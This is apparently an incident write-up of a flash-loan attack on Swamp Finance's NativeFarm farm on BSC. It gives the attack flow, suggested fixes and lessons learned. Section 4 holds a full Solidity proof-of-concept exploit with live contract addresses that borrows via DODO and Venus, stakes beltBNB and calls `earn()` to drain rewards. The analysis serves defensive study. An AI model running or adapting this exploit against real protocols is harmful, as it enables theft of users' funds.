# SwampFinance Flash Loan Venus Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Swamp Finance (NativeFarm) |
| Date | 2023-11-28 |
| Chain | BSC (Binance Smart Chain) |
| Loss | Undisclosed |
| Attack Type | DODO Flash Loan + Venus Collateral Manipulation + beltBNB Staking Arbitrage (Flash Loan + Venus Collateral + beltBNB Staking Arbitrage) |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0xfe2105e1317dfd6ed3887bf7882977c03cfebb7c` |
| Attack Contract | `0x22ad9eef79615a1592e969bdf7b238a07281ab80` |
| Vulnerable Contract | `0x33AdBf5f1ec364a4ea3a5CA8f310B597B8aFDee3` (NativeFarm) |
| Fork Block | 33,112,358 |

## 2. Vulnerable Code Analysis

Swamp Finance's NativeFarm contract paid rewards by staking beltBNB LP. The attacker obtained large amounts of WBNB and BUSDT via a DODO flash loan, then borrowed BNB against BUSDT collateral on the Venus protocol to acquire beltBNB. There was a business logic flaw where staking beltBNB into NativeFarm and calling `earn()` immediately after staking would generate a large reward payout.

```solidity
// Vulnerable pattern: NativeFarm earn() immediate reward distribution
contract NativeFarm {
    IStrategyBeltToken public strategy;

    // Vulnerable: calling earn() immediately after stake triggers instant reward
    function earn() external {
        strategy.earn(); // beltBNB compound - instant reward based on current staking balance
    }

    // No timelock on deposit/withdraw
    function deposit(uint256 _pid, uint256 _amount) external {
        // No minimum staking period
    }
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root Cause: DODO Flash Loan + Venus Collateral Manipulation + beltBNB Staking Arbitrage (Flash Loan + Venus Collateral + beltBNB Staking Arbitrage)
// Unverified source code — based on bytecode analysis
```

**Vulnerability**: NativeFarm calculated rewards immediately based on the current staking balance when `earn()` was called, allowing an attacker to temporarily stake a large amount via flash loan, call `earn()`, and immediately withdraw — receiving excess rewards relative to the deposit.

## 3. Attack Flow

```
Attacker [0xfe2105e1317dfd6ed3887bf7882977c03cfebb7c]
  │
  ├─1─▶ DPPOracle.flashLoan(3,100 WBNB, 150,000 BUSDT)
  │      [DPPOracle: 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  │      DPPFlashLoanCall callback triggered
  │
  ├─2─▶ Comptroller.enterMarkets([vUSDT, vBNB])
  │      [Venus Comptroller: 0xfD36E2c2a6789Db23113685031d7F16329158384]
  │      Venus market registration
  │
  ├─3─▶ vUSDT.mint(150,000 BUSDT)
  │      [vUSDT: 0xfD5840Cd36d94D7229439859C0112a4185BC0255]
  │      BUSDT collateral deposit → receive vUSDT
  │
  ├─4─▶ vBNB.borrow(500 BNB)
  │      [vBNB: 0xA07c5b74C9B40447a954e1466938b865b6BBea36]
  │      Borrow BNB against collateral
  │
  ├─5─▶ WBNB.deposit{value: 500 BNB}()
  │      BNB → WBNB conversion
  │
  ├─6─▶ beltBNB.deposit(WBNB, 1)
  │      [beltBNB: 0xa8Bb71facdd46445644C277F9499Dd22f6F0A30C]
  │      WBNB → beltBNB conversion
  │
  ├─7─▶ NativeFarm.deposit(135, beltBNB.balance)
  │      [NativeFarm: 0x33AdBf5f1ec364a4ea3a5CA8f310B597B8aFDee3]
  │      beltBNB staking (pid=135)
  │
  ├─8─▶ StrategyBeltToken.earn()
  │      [Strategy: 0xdA937DDD1F2bd57F507f5764a4F9550c750F7B31]
  │      Instant reward trigger → excess profit generated
  │
  ├─9─▶ NativeFarm.withdraw(135, max)
  │      Full withdrawal of staked balance
  │
  ├─10─▶ beltBNB.withdraw(beltBNB, 1)
  │       beltBNB → WBNB reverse conversion
  │
  ├─11─▶ WBNB.withdraw(500 BNB) + vBNB.repayBorrow{value: 500 BNB}()
  │       Venus BNB loan repayment
  │
  ├─12─▶ vUSDT.redeemUnderlying(150,000 BUSDT)
  │       BUSDT collateral redemption
  │
  └─13─▶ DPPOracle flash loan repayment + profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract SwampFinanceExploit {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IbeltBNB beltBNB = IbeltBNB(0xa8Bb71facdd46445644C277F9499Dd22f6F0A30C);
    DVM DPPOracle = DVM(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    ICointroller VenusDistribution = ICointroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    ICErc20Delegate vUSDT = ICErc20Delegate(payable(0xfD5840Cd36d94D7229439859C0112a4185BC0255));
    crETH vBNB = crETH(payable(0xA07c5b74C9B40447a954e1466938b865b6BBea36));
    INativeFarm NativeFarm = INativeFarm(0x33AdBf5f1ec364a4ea3a5CA8f310B597B8aFDee3);
    IStrategyBeltToken StrategyBeltToken = IStrategyBeltToken(0xdA937DDD1F2bd57F507f5764a4F9550c750F7B31);

    function testExploit() public {
        DPPOracle.flashLoan(3100e18, 150_000e18, address(this), bytes("_"));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256 quoteAmount, bytes calldata) external {
        // approvals
        BUSDT.approve(address(vUSDT), type(uint256).max);
        WBNB.approve(address(beltBNB), type(uint256).max);
        beltBNB.approve(address(NativeFarm), type(uint256).max);

        // Venus market registration
        address[] memory vTokens = new address[](2);
        vTokens[0] = address(vUSDT);
        vTokens[1] = address(vBNB);
        VenusDistribution.enterMarkets(vTokens);

        // BUSDT collateral deposit → BNB borrow
        vUSDT.mint(BUSDT.balanceOf(address(this)));
        vBNB.borrow(500 ether);
        WBNB.deposit{value: address(this).balance}();

        // Acquire beltBNB → NativeFarm staking
        beltBNB.deposit(WBNB.balanceOf(address(this)), 1);
        NativeFarm.deposit(135, beltBNB.balanceOf(address(this)));

        // Collect reward via immediate earn() call
        StrategyBeltToken.earn();

        // Full withdrawal
        NativeFarm.withdraw(135, type(uint256).max);
        beltBNB.withdraw(beltBNB.balanceOf(address(this)), 1);

        // Venus repayment
        WBNB.withdraw(500 ether);
        vBNB.repayBorrow{value: 500 ether}();
        uint256 cached = BUSDT.balanceOf(address(this));
        vUSDT.redeemUnderlying(cached);

        WBNB.transfer(address(DPPOracle), baseAmount);
        BUSDT.transfer(address(DPPOracle), quoteAmount);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | NativeFarm earn() instant reward calculation, no minimum staking period |
| Impact Scope | SwampFinance NativeFarm beltBNB reward pool |
| Explorer | [BSCscan](https://bscscan.com/address/0x33AdBf5f1ec364a4ea3a5CA8f310B597B8aFDee3) |

## 6. Security Recommendations

```solidity
// Fix 1: Enforce minimum staking period
mapping(address => mapping(uint256 => uint256)) public depositTimestamp;

function deposit(uint256 _pid, uint256 _amount) external {
    depositTimestamp[msg.sender][_pid] = block.timestamp;
    // ...
}

function withdraw(uint256 _pid, uint256 _amount) external {
    require(
        block.timestamp >= depositTimestamp[msg.sender][_pid] + 1 days,
        "Minimum staking period not met"
    );
    // ...
}

// Fix 2: Minimum staking requirement before earn() call
uint256 public earnCooldown = 1 hours;
uint256 public lastEarnTime;

function earn() external {
    require(block.timestamp >= lastEarnTime + earnCooldown, "Too soon");
    lastEarnTime = block.timestamp;
    strategy.earn();
}

// Fix 3: Single-block restriction for Venus-based staking
mapping(address => uint256) public lastDepositBlock;

function deposit(uint256 _pid, uint256 _amount) external {
    lastDepositBlock[msg.sender] = block.number;
    // ...
}

function withdraw(uint256 _pid, uint256 _amount) external {
    require(block.number > lastDepositBlock[msg.sender], "Same block deposit/withdraw");
    // ...
}
```

## 7. Lessons Learned

1. **Composite Protocol Flash Loan Attacks**: The multi-hop path through Venus → beltBNB → NativeFarm demonstrates that each protocol may be individually secure, yet combining them can introduce vulnerabilities.
2. **earn() Call Timing**: A design where calling `earn()` immediately after staking yields rewards is a classic flash loan attack target. A minimum time interval between `earn()` calls is required.
3. **Minimum Staking Period**: Without a constraint enforcing at least 1 block or a minimum elapsed time between deposit and withdraw, farming protocols are susceptible to flash loan attacks.
4. **Venus Collateral Leverage**: The pattern of using Venus as collateral leverage on BSC to acquire large quantities of farming tokens such as beltBNB is characteristic of BSC DeFi composite attacks.